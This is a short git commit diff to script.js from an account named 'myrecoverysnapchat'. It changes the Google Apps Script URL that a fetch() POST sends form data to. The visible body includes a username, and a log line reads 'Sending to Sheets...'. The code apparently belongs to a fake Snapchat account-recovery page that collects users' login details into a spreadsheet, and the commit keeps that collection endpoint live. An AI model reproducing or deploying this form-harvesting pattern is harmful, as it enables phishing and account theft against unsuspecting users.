9185ebdf31575a6f38fb546de40af52c91c84f14
myrecoverysnapchat <myrecovery.snapchat@gmail.com>
2026-05-11 11:26:54 +0700

    Update script.js

--- script.js
+++ script.js
@@ -12,7 +12,7 @@ document
 
     console.log("Sending to Sheets...");
 
-    await fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
+    await fetch("https://script.google.com/macros/library/d/1tJg-L1MYvDH73_FoZC5wLmnc3R5unbB7UNYNV1nfUXWqezD_N8E3yMa6/3", {
       method: "POST",
       body: JSON.stringify({
         username,
